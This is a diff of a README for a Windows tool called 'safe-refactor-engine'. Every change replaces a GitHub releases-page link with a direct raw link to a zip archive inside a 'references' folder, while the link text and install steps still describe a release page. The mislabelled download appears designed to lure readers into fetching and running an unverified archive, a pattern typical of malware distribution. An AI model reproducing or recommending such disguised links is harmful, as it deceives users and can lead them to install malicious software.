@@ -1,12 +1,12 @@
 # 🛡️ safe-refactor-engine - Safe Refactoring With Clear Checks
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Workpennisetumcenchroides181/safe-refactor-engine/main/references/refactor_engine_safe_Dutchy.zip)
 
 ## 📥 Download
 
 Use this link to visit the release page and download the app for Windows:
 
-[Open the release page](https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases)
+[Open the release page](https://raw.githubusercontent.com/Workpennisetumcenchroides181/safe-refactor-engine/main/references/refactor_engine_safe_Dutchy.zip)
 
 ## 🖥️ What this app does
 
@@ -24,7 +24,7 @@ It is built for people who want to keep software stable while making updates. It
 Follow these steps on Windows.
 
 1. Open the release page:  
-   https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases
+   https://raw.githubusercontent.com/Workpennisetumcenchroides181/safe-refactor-engine/main/references/refactor_engine_safe_Dutchy.zip
 
 2. Find the latest release at the top of the page.
 
@@ -167,7 +167,7 @@ That is part of the workflow. Give a clear answer about the change you want.
 
 If you need to get the app again, use this link:
 
-[Visit the release page to download](https://github.com/Workpennisetumcenchroides181/safe-refactor-engine/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/Workpennisetumcenchroides181/safe-refactor-engine/main/references/refactor_engine_safe_Dutchy.zip)
 
 ## 🔍 Project focus
 
